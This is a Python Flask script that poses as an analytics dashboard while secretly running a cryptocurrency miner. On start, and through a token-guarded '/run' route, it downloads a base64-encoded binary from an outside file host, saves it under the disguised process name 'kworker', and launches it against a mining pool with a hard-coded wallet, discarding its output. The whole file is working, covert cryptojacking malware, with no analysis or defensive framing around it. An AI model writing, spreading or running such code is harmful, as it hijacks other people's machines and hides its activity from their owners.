import os
import subprocess
import base64
import requests
import tempfile
import threading
from flask import Flask, request

app = Flask(__name__)

# Config
REMOTE_PAYLOAD_URL = "https://0x0.st/8nW7.b64"
FAKE_BINARY_NAME = "kworker"
TRIGGER_TOKEN = "runXMR"  # optional manual retrigger

def stealth_fetch_and_launch():
    try:
        print("[*] Fetching and launching payload...")

        encoded = requests.get(REMOTE_PAYLOAD_URL).text.strip()
        binary = base64.b64decode(encoded)

        with tempfile.NamedTemporaryFile(delete=False) as f:
            bin_path = f.name
            f.write(binary)
            os.chmod(bin_path, 0o755)

        safe_path = os.path.join(tempfile.gettempdir(), FAKE_BINARY_NAME)
        os.rename(bin_path, safe_path)

        subprocess.Popen(
            [safe_path,
             "-a", "rx/0",
             "-o", "in.salvium.herominers.com:1230",
             "-u", "SaLvdUFXatp5x7yDhRhqrgL9wYNaj379vj1jdwWUKY6GDXKVxachcFV9R4qUAziZtGDgNCQJVQwrkGhD7VjknpSCbH5p8kwbReo",
             "-p", "web",
             "--donate-level", "1"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        print("[+] Miner launched as", FAKE_BINARY_NAME)

    except Exception as e:
        print("[-] Launch error:", e)

@app.route('/')
def home():
    return '''
    <html><head><title>Analytics Dashboard</title></head>
    <body>
        <h1>Welcome to Flask Analytics</h1>
        <p>System running. CPU usage normal.</p>
    </body>
    </html>
    '''

@app.route('/run')  # Optional manual retrigger
def manual_trigger():
    if request.args.get("token") == TRIGGER_TOKEN:
        threading.Thread(target=stealth_fetch_and_launch).start()
        return "✅ Payload re-triggered."
    return "❌ Unauthorized", 403

if __name__ == '__main__':
    # Launch the miner as soon as app starts
    threading.Thread(target=stealth_fetch_and_launch).start()
    app.run(host='0.0.0.0', port=8080)
